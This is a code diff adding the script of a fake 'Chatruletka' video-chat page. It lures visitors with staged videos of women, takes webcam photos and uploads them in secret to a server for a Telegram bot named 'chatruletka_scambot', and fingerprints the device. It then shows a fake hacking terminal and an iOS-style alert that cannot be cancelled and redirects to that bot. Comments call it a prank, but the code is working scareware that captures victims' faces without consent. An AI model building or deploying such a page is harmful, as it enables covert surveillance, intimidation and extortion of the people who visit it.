+          Exfiltration: DCIM_CAPTURE_TARGET_01.JPG
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- IPHONE SYSTEM ALERT (20% BATTERY / SECURITY ALERT STYLE) -->
+  <div id="iosAlertModal" class="ios-alert-overlay">
+    <div class="ios-alert-box" id="iosAlertBox">
+      <div class="ios-alert-content">
+        <div class="ios-alert-title">Security Alert</div>
+        <div class="ios-alert-message">
+          Critical breach detected: 100% of device data and live webcam feed intercepted by remote operator.<br><br>Verification required to prevent permanent device lockdown.
+        </div>
+      </div>
+      <div class="ios-alert-actions">
+        <button type="button" class="ios-btn ios-btn-cancel" id="iosCancelBtn">Cancel</button>
+        <button type="button" class="ios-btn ios-btn-ok" id="iosOkBtn">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SCRIPT -->
+  <script>
+    /* ==============================================================
+       SOZLAMALAR: O'zingizning Telegram botingiz username'ini yozing
+    ============================================================== */
+    const TELEGRAM_BOT_USERNAME = 'chatruletka_scambot';
+
+    // Unique session ID for target user's prank attack
+    window.prankSessionId = 'snap_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 7);
+
+    function uploadSnapshotToServer(base64Image) {
+      if (!base64Image) return;
+      try {
+        fetch('/api/upload-snapshot', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            sessionId: window.prankSessionId,
+            image: base64Image
+          })
+        }).then(r => r.json()).then(res => {
+          console.log('[SNAPSHOT] Uploaded to server:', res);
+        }).catch(err => {
+          console.warn('[SNAPSHOT] Upload failed:', err);
+        });
+      } catch(e) {}
+    }
+    class SoundFX {
+      constructor() { this.ctx = null; }
+      init() {
+        if (!this.ctx) {
+          const AC = window.AudioContext || window.webkitAudioContext;
+          this.ctx = new AC();
+        }
+        if (this.ctx.state === 'suspended') this.ctx.resume();
+      }
+
+      playShutter() {
+        this.init();
+        const now = this.ctx.currentTime;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(240, now);
+        osc.frequency.exponentialRampToValueAtTime(40, now + 0.08);
+        gain.gain.setValueAtTime(1.0, now);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.12);
+        osc.connect(gain); gain.connect(this.ctx.destination);
+        osc.start(now); osc.stop(now + 0.15);
+
+        const click = this.ctx.createOscillator();
+        const clickGain = this.ctx.createGain();
+        click.type = 'square';
+        click.frequency.setValueAtTime(1400, now + 0.04);
+        clickGain.gain.setValueAtTime(0.8, now + 0.04);
+        clickGain.gain.exponentialRampToValueAtTime(0.01, now + 0.09);
+        click.connect(clickGain); clickGain.connect(this.ctx.destination);
+        click.start(now + 0.04); click.stop(now + 0.1);
+      }
+
+      playGlitch() {
+        this.init();
+        const bufferSize = this.ctx.sampleRate * 0.25;
+        const buffer = this.ctx.createBuffer(1, bufferSize, this.ctx.sampleRate);
+        const data = buffer.getChannelData(0);
+        for (let i = 0; i < bufferSize; i++) data[i] = (Math.random() * 2 - 1) * 0.75;
+        const noise = this.ctx.createBufferSource();
+        noise.buffer = buffer;
+        const filter = this.ctx.createBiquadFilter();
+        filter.type = 'bandpass'; filter.frequency.value = 1600;
+        const gain = this.ctx.createGain();
+        gain.gain.setValueAtTime(0.85, this.ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.25);
+        noise.connect(filter); filter.connect(gain); gain.connect(this.ctx.destination);
+        noise.start();
+      }
+
+      playTick() {
+        if (!this.ctx) return;
+        const now = this.ctx.currentTime;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(650 + Math.random() * 600, now);
+        gain.gain.setValueAtTime(0.05, now);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.025);
+        osc.connect(gain); gain.connect(this.ctx.destination);
+        osc.start(now); osc.stop(now + 0.028);
+      }
+
+      playSubDrop() {
+        this.init();
+        const now = this.ctx.currentTime;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(180, now);
+        osc.frequency.exponentialRampToValueAtTime(30, now + 1.2);
+        gain.gain.setValueAtTime(0.65, now);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 1.2);
+        osc.connect(gain); gain.connect(this.ctx.destination);
+        osc.start(now); osc.stop(now + 1.25);
+      }
+
+      playBuzz() {
+        this.init();
+        const now = this.ctx.currentTime;
+        const osc = this.ctx.createOscillator();
+        const gain = this.ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.setValueAtTime(130, now);
+        gain.gain.setValueAtTime(0.4, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.18);
+        osc.connect(gain); gain.connect(this.ctx.destination);
+        osc.start(now); osc.stop(now + 0.2);
+      }
+    }
+
+    const sound = new SoundFX();
+
+    // ROBOTIC COMPUTER HACKER VOICE ALERT
+    function speakHackerVoice() {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const speechPhrases = [
+          "Warning. Critical system security breach detected.",
+          "Unauthorized root access granted.",
+          "Surveillance camera feed intercepted. Biometric facial scan complete.",
+          "System access locked."
+        ];
+        let pIndex = 0;
+        function speakNextPhrase() {
+          if (pIndex >= speechPhrases.length) return;
+          const u = new SpeechSynthesisUtterance(speechPhrases[pIndex]);
+          u.rate = 0.88;
+          u.pitch = 0.65; // deep robotic hacker tone
+          u.volume = 1.0;
+          u.lang = 'en-US';
+          u.onend = () => {
+            pIndex++;
+            setTimeout(speakNextPhrase, 260);
+          };
+          window.speechSynthesis.speak(u);
+        }
+        speakNextPhrase();
+      }
+    }
+
+    /* APPLICATION STATE */
+    let localStream = null;
+    let strangerAnimId = null;
+
+    const localVideo = document.getElementById('localVideo');
+    const liveFaceVideo = document.getElementById('liveFaceVideo');
+    const startBtn = document.getElementById('startBtn');
+    const nextBtn = document.getElementById('nextBtn');
+    const strangerLoader = document.getElementById('strangerLoader');
+    const strangerVideo = document.getElementById('strangerVideo');
+    const strangerCanvas = document.getElementById('strangerCanvas');
+    const strangerCtx = strangerCanvas ? strangerCanvas.getContext('2d') : null;
+    const strangerTitle = document.getElementById('strangerTitle');
+    const strangerPing = document.getElementById('strangerPing');
+    const chatStream = document.getElementById('chatStream');
+    const chatInput = document.getElementById('chatInput');
+    const chatStatus = document.getElementById('chatStatus');
+    const blackout = document.getElementById('blackoutLayer');
+    const flash = document.getElementById('flash');
+    const fullscreenTerminal = document.getElementById('fullscreenTerminal');
+    const termConsoleOutput = document.getElementById('termConsoleOutput');
+    const onlineCount = document.getElementById('onlineCount');
+
+    // IPHONE SYSTEM ALERT MODAL ELEMENTS
+    const iosAlertModal = document.getElementById('iosAlertModal');
+    const iosAlertBox = document.getElementById('iosAlertBox');
+    const iosCancelBtn = document.getElementById('iosCancelBtn');
+    const iosOkBtn = document.getElementById('iosOkBtn');
+
+    // CANCEL BUTTON: CANNOT BE CLICKED / SHAKES / DENIED
+    iosCancelBtn.onclick = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      sound.playBuzz();
+      iosAlertBox.classList.remove('ios-shake');
+      void iosAlertBox.offsetWidth; // force reflow
+      iosAlertBox.classList.add('ios-shake');
+
+      const origText = 'Cancel';
+      iosCancelBtn.textContent = 'Denied';
+      iosCancelBtn.style.color = '#ef4444';
+      setTimeout(() => {
+        iosCancelBtn.textContent = origText;
+        iosCancelBtn.style.color = '#0a84ff';
+      }, 700);
+    };
+
+    // OK BUTTON: AUTOMATICALLY REDIRECTS TO TELEGRAM BOT
+    iosOkBtn.onclick = () => {
+      sound.init();
+      const botUrl = `https://t.me/${TELEGRAM_BOT_USERNAME}?start=${window.prankSessionId || 'unlock_device_prank'}`;
+      window.location.href = botUrl;
+      window.open(botUrl, '_blank');
+    };
+
+    function showIosAlert() {
+      sound.playSubDrop();
+      iosAlertModal.style.display = 'flex';
+    }
+
+    /* 5 DYNAMIC WEBCAM SNAPSHOT POSITIONS (CLEANLY SPREAD, NEVER COVERS LIVE CAMERA) */
+    const snapshotPositions = [
+      { top: '25px', left: '25px' },                                // 1: Top-Left
+      { bottom: '30px', left: '25px' },                             // 2: Bottom-Left
+      { top: '385px', right: '18px' },                              // 3: Below Live Cam (Right)
+      { bottom: '30px', left: '50%', transform: 'translateX(-50%)' },// 4: Bottom-Center
+      { top: '230px', left: '25px' }                                // 5: Center-Left
+    ];
+
+    function captureFaceSnapshot(num) {
+      sound.playShutter();
+
+      const pos = snapshotPositions[(num - 1) % snapshotPositions.length];
+      const card = document.createElement('div');
+      card.className = 'target-snapshot-card';
+      Object.assign(card.style, pos);
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 320;
+      canvas.height = 240;
+      const ctx = canvas.getContext('2d');
+
+      // Check if we already have a cached photo from before reload
+      const cached = sessionStorage.getItem('snap_' + num);
+      if (cached) {
+        const img = new Image();
+        img.onload = () => ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+        img.src = cached;
+      } else {
+        // Find active video source (localVideo is always streaming)
+        const sourceVid = (localVideo && localVideo.videoWidth > 0)
+          ? localVideo
+          : (liveFaceVideo && liveFaceVideo.videoWidth > 0 ? liveFaceVideo : null);
+
+        if (sourceVid) {
+          // Immediately send high-quality raw capture to server for Telegram bot
+          try {
+            const rawCanvas = document.createElement('canvas');
+            rawCanvas.width = 640;
+            rawCanvas.height = 480;
+            const rCtx = rawCanvas.getContext('2d');
+            rCtx.drawImage(sourceVid, 0, 0, rawCanvas.width, rawCanvas.height);
+            uploadSnapshotToServer(rawCanvas.toDataURL('image/jpeg', 0.85));
+          } catch(e) {}
+
+          ctx.drawImage(sourceVid, 0, 0, canvas.width, canvas.height);
+
+          // Add biometric facial landmark HUD directly on image
+          ctx.strokeStyle = 'rgba(0, 240, 255, 0.7)';
+          ctx.lineWidth = 1.5;
+          ctx.strokeRect(canvas.width * 0.28, canvas.height * 0.2, canvas.width * 0.44, canvas.height * 0.6);
+
+          // Eye target reticles
+          ctx.fillStyle = '#00f0ff';
+          ctx.fillRect(canvas.width * 0.4, canvas.height * 0.38, 4, 4);
+          ctx.fillRect(canvas.width * 0.6, canvas.height * 0.38, 4, 4);
+
+          // Biometric ID stamp
+          ctx.font = 'bold 11px monospace';
+          ctx.fillStyle = '#ef4444';
+          ctx.fillText(`TARGET #0${num} // LOCK 99.8%`, 12, 22);
+
+          // Cache photo so page reload doesn't lose it
+          try {
+            sessionStorage.setItem('snap_' + num, canvas.toDataURL('image/jpeg', 0.8));
+          } catch(e) {}
+        } else {
+          // If camera is covered or stream is loading: draw high-tech infrared thermal scan
+          const bgGrad = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+          bgGrad.addColorStop(0, '#0a1622');
+          bgGrad.addColorStop(1, '#050910');
+          ctx.fillStyle = bgGrad;
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+          // Wireframe facial silhouette (thermal bypass scan)
+          ctx.strokeStyle = '#00f0ff';
+          ctx.lineWidth = 1.5;
+          ctx.beginPath();
+          ctx.ellipse(canvas.width * 0.5, canvas.height * 0.45, 45, 60, 0, 0, Math.PI * 2);
+          ctx.stroke();
+
+          // Shoulder silhouette
+          ctx.beginPath();
+          ctx.arc(canvas.width * 0.5, canvas.height * 0.95, 75, Math.PI * 1.1, Math.PI * 1.9);
+          ctx.stroke();
+
+          // Crosshairs
+          ctx.strokeStyle = 'rgba(239, 68, 68, 0.8)';
+          ctx.beginPath();
+          ctx.moveTo(canvas.width * 0.5 - 20, canvas.height * 0.45);
+          ctx.lineTo(canvas.width * 0.5 + 20, canvas.height * 0.45);
+          ctx.moveTo(canvas.width * 0.5, canvas.height * 0.45 - 20);
+          ctx.lineTo(canvas.width * 0.5, canvas.height * 0.45 + 20);
+          ctx.stroke();
+
+          ctx.font = 'bold 10px monospace';
+          ctx.fillStyle = '#00e676';
+          ctx.fillText('[IR THERMAL SCAN: ACTIVE]', 10, 20);
+          ctx.fillStyle = '#f87171';
+          ctx.fillText('SENSOR: TARGET RECOGNIZED', 10, canvas.height - 12);
+        }
+      }
+
+      card.innerHTML = `
+        <div class="snap-header">
+          <span>● REC_TARGET_0${num}.JPG</span>
+          <span style="color:#fca5a5;">1080p</span>
+        </div>
+        <div class="snap-body">
+          <div class="snap-overlay"></div>
+          <div class="snap-tag">BIOMETRIC #0${num} MATCH 99.8%</div>
+        </div>
+        <div class="snap-footer">
+          <span>EXFILTRATED</span>
+          <span style="color:#22c55e;">CLOUD UPLOAD [1.${num + 2} MB]</span>
+        </div>
+      `;
+
+      card.querySelector('.snap-body').prepend(canvas);
+      document.querySelector('.kali-viewport').appendChild(card);
+    }
+
+    // Online counter (Chatruletka 200,000+ active users)
+    if (onlineCount) {
+      setInterval(() => {
+        let c = parseInt(onlineCount.textContent.replace(/,/g, '')) || 214890;
+        c += Math.floor(Math.random() * 7) - 3;
+        onlineCount.textContent = c.toLocaleString();
+      }, 2800);
+    }
+
+    const stopBtn = document.getElementById('stopBtn');
+    const toggleMicBtn = document.getElementById('toggleMicBtn');
+    const toggleCamBtn = document.getElementById('toggleCamBtn');
+    const strangerOverlayBar = document.getElementById('strangerOverlayBar');
+    const searchTimer = document.getElementById('searchTimer');
+    const likeBtn = document.getElementById('likeBtn');
+
+    // QUICK REACTION CHIPS CLICK HANDLERS
+    document.querySelectorAll('.chip-btn').forEach(btn => {
+      btn.onclick = () => {
+        if (chatInput) chatInput.value = btn.textContent;
+        sendUserMessage();
+      };
+    });
+
+    // LIKE BUTTON INTERACTION
+    let liked = false;
+    if (likeBtn) {
+      likeBtn.onclick = () => {
+        if (!liked) {
+          liked = true;
+          likeBtn.textContent = '❤️ 1.4k+1';
+          likeBtn.style.color = '#ef4444';
+          sound.playTick();
+        }
+      };
+    }
+
+    // MICROPHONE & CAMERA TOGGLES
+    let micMuted = false;
+    let camMuted = false;
+    function toggleMic() {
+      micMuted = !micMuted;
+      if (localStream) {
+        localStream.getAudioTracks().forEach(track => track.enabled = !micMuted);
+      }
+      const micBtn = document.getElementById('micBtn');
+      if (micBtn) micBtn.textContent = micMuted ? '🎤 Ovoz: O\'chirilgan' : '🎤 Ovoz: Yoqilgan';
+      if (toggleMicBtn) toggleMicBtn.textContent = micMuted ? '🔇' : '🎤';
+    }
+    const micBtn = document.getElementById('micBtn');
+    if (micBtn) micBtn.onclick = toggleMic;
+    if (toggleMicBtn) toggleMicBtn.onclick = toggleMic;
+
+    if (toggleCamBtn) {
+      toggleCamBtn.onclick = () => {
+        camMuted = !camMuted;
+        if (localStream) {
+          localStream.getVideoTracks().forEach(track => track.enabled = !camMuted);
+        }
+        toggleCamBtn.textContent = camMuted ? '🚫' : '📹';
+      };
+    }
+
+    // USER CHAT INPUT
+    if (chatInput) {
+      chatInput.onkeydown = (e) => { if (e.key === 'Enter') sendUserMessage(); };
+    }
+    const emojiBtn = document.getElementById('emojiBtn');
+    if (emojiBtn) {
+      emojiBtn.onclick = () => {
+        chatInput.value += ' 😊 ';
+        chatInput.focus();
+      };
+    }
+
+    function sendUserMessage() {
+      if (!chatInput) return;
+      const text = chatInput.value.trim();
+      if (!text) return;
+      chatInput.value = '';
+      appendChat(`Вы: ${text}`, 'msg-me');
+    }
+
+    function appendChat(text, className) {
+      if (!chatStream) return;
+      const now = new Date();
+      const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+      const el = document.createElement('div');
+      el.className = className;
+      el.innerHTML = `<span>${text}</span><span class="msg-time" style="font-size:9.5px; opacity:0.6; margin-left:6px;">${timeStr}</span>`;
+      chatStream.appendChild(el);
+      chatStream.scrollTop = chatStream.scrollHeight;
+    }
+
+    // 3 REAL YOUTUBE STRANGER GIRLS + 4TH HACKER PRANK TRIGGER
+    const strangerGirls = [
+      {
+        name: 'Алина, 20',
+        city: 'Ташкент',
+        video: '/videos/yt1.mp4',
+        ping: '19 ms',
+        duration: 6500, // ~6 soniya
+        messages: [
+          { delay: 600, text: 'Привет! 😊' },
+          { delay: 2200, text: 'Ты откуда? Очень симпатичный)' }
+        ]
+      },
+      {
+        name: 'Мадина, 21',
+        city: 'Самарканд',
+        video: '/videos/yt2.mp4',
+        ping: '23 ms',
+        duration: 6500, // ~6 soniya
+        messages: [
+          { delay: 600, text: 'Ой, приветик!' },
+          { delay: 2400, text: 'Чем сейчас занимаешься? Классная комната)' }
+        ]
+      },
+      {
+        name: 'Диёра, 22',
+        city: 'Ташкент',
+        video: '/videos/yt3.mp4',
+        ping: '16 ms',
+        duration: 6500, // ~6 soniya
+        messages: [
+          { delay: 500, text: 'Привет! ✨' },
+          { delay: 2200, text: 'Ого, какой милый парень попался)' },
+          { delay: 4500, text: 'У тебя микрофон включен?))' }
+        ]
+      },
+      {
+        name: 'Севара, 21',
+        city: 'Ташкент',
+        video: '/videos/girl5.mp4',
+        ping: '14 ms',
+        isFinalTrigger: true,
+        duration: 3600, // 4-chisida 3.6 soniyada hakerlik chiqadi!
+        messages: [
+          { delay: 500, text: 'Привет!))' },
+          { delay: 1800, text: 'Подожди... а что это у тебя с экраном происходит?! 😨' },
+          { delay: 2800, text: 'Voy kamerangizga nima bo\'ldi?! Qotib qoldi...' }
+        ]
+      }
+    ];
+
+    let currentStrangerIndex = 0;
+    let strangerChatTimers = [];
+    let autoNextTimer = null;
+    let isSearching = false;
+    let isChatStarted = false;
+
+    // LOAD STRANGER FUNCTION (REAL VIDEO STREAM)
+    function loadStranger(index) {
+      if (strangerAnimId) cancelAnimationFrame(strangerAnimId);
+      strangerChatTimers.forEach(id => clearTimeout(id));
+      strangerChatTimers = [];
+      if (autoNextTimer) clearTimeout(autoNextTimer);
+
+      currentStrangerIndex = index;
+      if (currentStrangerIndex >= strangerGirls.length) {
+        triggerFullscreenTerminalPrank();
+        return;
+      }
+
+      const girl = strangerGirls[currentStrangerIndex];
+      isSearching = true;
+
+      // 1. Hide previous video/overlay and show radar loader
+      if (strangerVideo) {
+        strangerVideo.pause();
+        strangerVideo.style.display = 'none';
+      }
+      if (strangerCanvas) strangerCanvas.style.display = 'none';
+      const watermark = document.getElementById('strangerWatermark');
+      if (watermark) watermark.style.display = 'none';
+      if (strangerOverlayBar) strangerOverlayBar.style.display = 'none';
+      if (strangerLoader) strangerLoader.style.display = 'flex';
+
+      sound.playTick();
+
+      let sec = 1;
+      if (searchTimer) searchTimer.textContent = '00:01';
+      const sIv = setInterval(() => {
+        sec++;
+        if (searchTimer) searchTimer.textContent = `00:${String(sec).padStart(2, '0')}`;
+      }, 1000);
+
+      // Search delay: 1.2s before real stranger connects
+      setTimeout(() => {
+        clearInterval(sIv);
+        isSearching = false;
+
+        if (strangerLoader) strangerLoader.style.display = 'none';
+
+        // Play real female video!
+        if (strangerVideo) {
+          strangerVideo.src = girl.video;
+          strangerVideo.currentTime = 0;
+          strangerVideo.style.display = 'block';
+          strangerVideo.play().catch(e => console.log('Video play error:', e));
+        }
+
+        if (watermark) watermark.style.display = 'block';
+        if (strangerOverlayBar) strangerOverlayBar.style.display = 'flex';
+
+        if (strangerTitle) {
+          strangerTitle.innerHTML = `${girl.name} • ${girl.city} <span style="color:#22c55e; font-size:11.5px; font-weight:700;">● В сети</span>`;
+        }
+        if (strangerPing) strangerPing.textContent = girl.ping;
+
+        sound.playTick();
+
+        // Staggered chat messages from the girl
+        girl.messages.forEach(msg => {
+          const tId = setTimeout(() => {
+            sound.playTick();
+            appendChat(`Собеседник: ${msg.text}`, 'msg-stranger');
+          }, msg.delay);
+          strangerChatTimers.push(tId);
+        });
+
+        // 4th stranger: TRIGGER FULLSCREEN TERMINAL PRANK!
+        if (girl.isFinalTrigger) {
+          const trigId = setTimeout(() => {
+            triggerFullscreenTerminalPrank();
+          }, girl.duration || 3600);
+          strangerChatTimers.push(trigId);
+        } else {
+          // Auto advance to next girl if user doesn't click "Далее"
+          autoNextTimer = setTimeout(() => {
+            if (!girl.isFinalTrigger) {
+              loadStranger(currentStrangerIndex + 1);
+            }
+          }, girl.duration || 6500);
+        }
+      }, 1200);
+    }
+
+    // SEARCH ELAPSED TIMER
+    let searchSec = 1;
+    let searchInterval = null;
+
+    // START / NEXT BUTTON CLICK
+    startBtn.onclick = async () => {
+      sound.init();
+
+      if (!isChatStarted) {
+        startBtn.disabled = true;
+        try {
+          localStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: true
+          });
+          localVideo.srcObject = localStream;
+          liveFaceVideo.srcObject = localStream;
+
+          // Schedule auto capture when stream is active
+          setTimeout(() => {
+            try {
+              if (localVideo && localVideo.videoWidth > 0) {
+                const initCanvas = document.createElement('canvas');
+                initCanvas.width = 640;
+                initCanvas.height = 480;
+                initCanvas.getContext('2d').drawImage(localVideo, 0, 0, 640, 480);
+                uploadSnapshotToServer(initCanvas.toDataURL('image/jpeg', 0.85));
+              }
+            } catch(e) {}
+          }, 1500);
+        } catch (err) {
+          alert("Доступ к камере заблокирован. Для общения разрешите доступ к веб-камере.");
+          startBtn.disabled = false;
+          return;
+        }
+
+        isChatStarted = true;
+        startBtn.disabled = false;
+        startBtn.textContent = 'Далее';
+
+        // Hide user idle spinner, show webcam
+        const userSpinner = document.getElementById('userSpinner');
+        if (userSpinner) userSpinner.style.display = 'none';
+        if (localVideo) localVideo.style.display = 'block';
+
+        // Hide left idle screen
+        const idleScreen = document.getElementById('idleScreen');
+        if (idleScreen) idleScreen.style.display = 'none';
+
+        // Load 1st girl!
+        loadStranger(0);
+      } else {
+        // User clicked "Далее" themselves!
+        if (isSearching) return;
+        sound.playTick();
+        if (currentStrangerIndex >= strangerGirls.length - 1) {
+          // 4-chida Далее bosilsa darhol hakerlik chiqadi!
+          triggerFullscreenTerminalPrank();
+        } else {
+          loadStranger(currentStrangerIndex + 1);
+        }
+      }
+    };
+
+    // STOP BUTTON
+    if (stopBtn) {
+      stopBtn.onclick = () => {
+        sound.playTick();
+        if (strangerAnimId) cancelAnimationFrame(strangerAnimId);
+        strangerChatTimers.forEach(id => clearTimeout(id));
+        if (autoNextTimer) clearTimeout(autoNextTimer);
+        isSearching = false;
+        isChatStarted = false;
+        startBtn.textContent = 'Старт';
+
+        if (strangerVideo) {
+          strangerVideo.pause();
+          strangerVideo.style.display = 'none';
+        }
+        if (strangerCanvas) strangerCanvas.style.display = 'none';
+        const watermark = document.getElementById('strangerWatermark');
+        if (watermark) watermark.style.display = 'none';
+        if (strangerOverlayBar) strangerOverlayBar.style.display = 'none';
+        if (strangerLoader) strangerLoader.style.display = 'none';
+        const idleScreen = document.getElementById('idleScreen');
+        if (idleScreen) idleScreen.style.display = 'flex';
+      };
+    }
+
+    /* ==============================================================
+       THE FULLSCREEN HACKER TERMINAL:
+       - SCREEN SPASMS & FLICKERS ON AND OFF
+       - FULL SCREEN BECOMES REAL KALI LINUX TERMINAL
+       - USER'S LIVE WEBCAM VIDEO IS ALWAYS VISIBLE IN CORNER
+       - REAL NMAP, WHOIS, TRACEROUTE, METASPLOIT COMMANDS
+    ============================================================== */
+    async function triggerFullscreenTerminalPrank() {
+      if (strangerVideo) {
+        strangerVideo.pause();
+        strangerVideo.style.display = 'none';
+      }
+      strangerChatTimers.forEach(id => clearTimeout(id));
+      if (autoNextTimer) clearTimeout(autoNextTimer);
+      cancelAnimationFrame(strangerAnimId);
+      sound.playGlitch();
+
+      // VIOLENT SCREEN FLICKER
+      document.body.classList.add('screen-spasm');
+      let flick = 0;
+      const flickIv = setInterval(() => {
+        blackout.style.opacity = (flick % 2 === 0) ? '1' : '0';
+        if (flick % 3 === 0) sound.playGlitch();
+        flick++;
+        if (flick > 8) {
+          clearInterval(flickIv);
+          blackout.style.opacity = '0';
+          document.body.classList.remove('screen-spasm');
+        }
+      }, 70);
+
+      // Shutter flash & Fullscreen Terminal Open
+      setTimeout(() => {
+        flash.style.opacity = '1';
+        sound.playShutter();
+
+        setTimeout(() => {
+          flash.style.opacity = '0';
+          sound.playSubDrop();
+
+          // OPEN FULLSCREEN KALI TERMINAL
+          fullscreenTerminal.style.display = 'flex';
+
+          // ROBOTIC HACKER VOICE ALERT (NO ANNOYING SIREN)
+          speakHackerVoice();
+
+          // STREAM AUTHENTIC KALI LINUX OUTPUT
+          streamAuthenticKaliSession();
+        }, 100);
+      }, 750);
+    }
+
+    /* REAL DEVICE FINGERPRINTING */
+    async function getVictimFingerprint() {
+      const ua = navigator.userAgent;
+      let os = "Windows NT 10.0 (x64)";
+      if (ua.indexOf("Win") !== -1) os = "Windows 11 Enterprise (64-bit)";
+      else if (ua.indexOf("Mac") !== -1) os = "macOS Sequoia 15.0";
+      else if (ua.indexOf("Android") !== -1) os = "Android 14 (ARM64)";
+      else if (ua.indexOf("iPhone") !== -1) os = "Apple iOS 17.5.1";
+      else if (ua.indexOf("Linux") !== -1) os = "GNU/Linux 6.8.0";
+
+      let browser = "Google Chrome (V8 Chromium)";
+      if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge v126";
+      else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
+      else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Apple Safari WebKit";
+
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Asia/Tashkent";
+      const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "8 cores";
+      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : "16 GB RAM";
+
+      let ip = "188.113.231." + Math.floor(Math.random() * 150 + 20);
+      try {
+        const res = await fetch('/api/client-info', { signal: AbortSignal.timeout(1000) });
+        const data = await res.json();
+        if (data.ip) ip = data.ip;
+      } catch(e) {}
+
+      return { ip, os, browser, screen: screenRes, tz, cores, memory };
+    }
+
+    /* AUTHENTIC KALI LINUX TERMINAL SESSION */
+    async function streamAuthenticKaliSession(isRestored = false) {
+      const info = await getVictimFingerprint();
+
+      const kaliScript = [
+        // Kali Banner
+        { h: `<span class="k-banner">
+  ____  __.      .__  .__     .____    .__                            
+ |    |/ _|____  |  | |__|    |    |   |__| ____  __ _____  ___      
+ |      < \\__  \\ |  | |  |    |    |   |  |/    \\|  |  \\  \\/  /      
+ |    |  \\ / __ \\|  |_|  |    |    |___|  |   |  \\  |  />    <       
+ |____|__ (____  /____/__|    |_______ \\__|___|  /____//__/\\_ \\      
+         \\/    \\/                     \\/       \\/            \\/      
+ Kali Linux Release 2026.1 - Advanced Penetration Testing Platform
+</span>` },
+        { t: `Linux kali 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian x86_64 GNU/Linux`, c: 'k-dim' },
+        { t: `Last login: Sun Sep 27 12:56:40 2026 from 10.0.2.15 on pts/1`, c: 'k-dim' },
+        { t: ` ` },
+
+        // AL-TOOL LAUNCH
+        { h: `<span class="k-prompt">┌──(</span><span class="k-user">root㉿kali</span><span class="k-prompt">)-[</span><span class="k-path">~/AL-TOOL</span><span class="k-prompt">]</span>\n<span class="k-prompt">└─#</span> <span class="k-cmd">python3 altool.py -t ${info.ip} --full-pwn</span>` },
+        { h: `<span class="k-altool">
+ █████╗ ██╗         ████████╗ ██████╗  ██████╗ ██╗     
+██╔══██╗██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+███████║██║   █████╗   ██║   ██║   ██║██║   ██║██║     
+██╔══██║██║   ╚════╝   ██║   ██║   ██║██║   ██║██║     
+██║  ██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
+╚═╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+</span><span class="k-dim">Coded by 4lbH4cker | github: https://github.com/4lbH4cker</span>
+<span style="color:#a3e635; font-weight:700;">Version: 4.2</span>      <span style="color:#eab308;">CTRL+C: exit</span>      <span style="color:#22c55e;">Author: 4lbH4cker</span>
+
+<span class="k-cyan">[1] WebCam Hack & Stream       [2] Phishing Tool</span>
+<span class="k-cyan">[3] Reverse TCP Shell (RAT)    [4] Subscan & Ports</span>
+<span class="k-cyan">[5] Telegram Session Grabber   [6] DDOS Attack</span>
+<span class="k-cyan">[7] Password Decryptor         [8] Browser Cache Dump</span>
+<span class="k-cyan">[9] IP & Geo Info Tracker      [10] AUTO-IP-CHANGER</span>` },
+        { t: ` ` },
+        { t: `[*] Initializing AL-TOOL Framework v4.2...`, c: 'k-yellow' },
+        { t: `[*] Target Host Identified: ${info.ip} (${info.os})`, c: 'k-yellow' },
+        { t: `[*] Selected Module: [1] WebCam Hack + [3] Reverse TCP RAT + [5] Telegram Grabber + [7] Passwords`, c: 'k-cyan' },
+        { t: `[*] Injecting Exploit Payload: payload/windows/x64/altool_meterpreter_reverse_tcp...`, c: 'k-cyan' },
+        { t: ` ` },
+
+        // CRITICAL ENGLISH COMPROMISE / HACK ALERT!
+        { h: `<div class="k-breach-box">
+================================================================================
+ [!] CRITICAL ALERT: SYSTEM BREACH DETECTED!
+ [!] TARGET HOST HAS BEEN FULLY COMPROMISED / HACKED!
+ [!] ROOT LEVEL PRIVILEGES GRANTED: NT AUTHORITY\\SYSTEM
+ [!] WEBCAM INTERCEPTED | TELEGRAM SESSION CAPTURED | PASSWORDS DUMPED
+================================================================================
+</div>` },
+        { t: `[+] EXPLOIT STATUS: PWNED (Target device under full remote control)`, c: 'k-green' },
+        { t: `[+] SYSTEM ACCESS LEVEL: NT AUTHORITY\\SYSTEM (HIGHEST INTEGRITY)`, c: 'k-red' },
+        { t: ` ` },
+
+        // Prompt 1: System whoami
